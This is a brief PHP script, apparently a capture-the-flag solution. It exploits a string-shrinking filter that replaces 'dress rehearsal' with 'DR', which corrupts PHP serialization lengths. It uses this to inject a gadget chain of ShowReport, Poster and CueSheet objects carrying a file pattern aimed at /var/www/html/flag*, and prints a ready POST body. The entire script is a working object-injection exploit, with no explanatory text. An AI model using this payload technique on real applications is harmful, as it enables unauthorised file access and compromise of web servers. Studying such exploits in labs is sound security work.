<?php
class CrewPrefs { public $name='Guest'; public $tagline=''; public $role='volunteer'; public $theme='house-lights'; }
function abbreviate($s){ return str_replace('dress rehearsal','DR',$s); }
$pattern = $argv[1] ?? '/var/www/html/flag*';
$G='O:10:"ShowReport":1:{s:4:"line";O:6:"Poster":1:{s:7:"content";O:8:"CueSheet":1:{s:7:"pattern";s:'.strlen($pattern).':"'.$pattern.'";}}}';
$name='dress rehearsaldress rehearsal';            // 30B -> "DRDR" (4B), over-read 26
foreach([3,2,4] as $dig){
  $offset=26-(20+$dig); if($offset<0) continue;
  $tagline=str_repeat('A',$offset).'";s:1:"x";'.$G;
  if(strlen((string)strlen($tagline))!=$dig || strlen($tagline)>200) continue;
  echo "POSTBODY=name=".urlencode($name)."&tagline=".urlencode($tagline)."&role=actor\n"; exit;
}
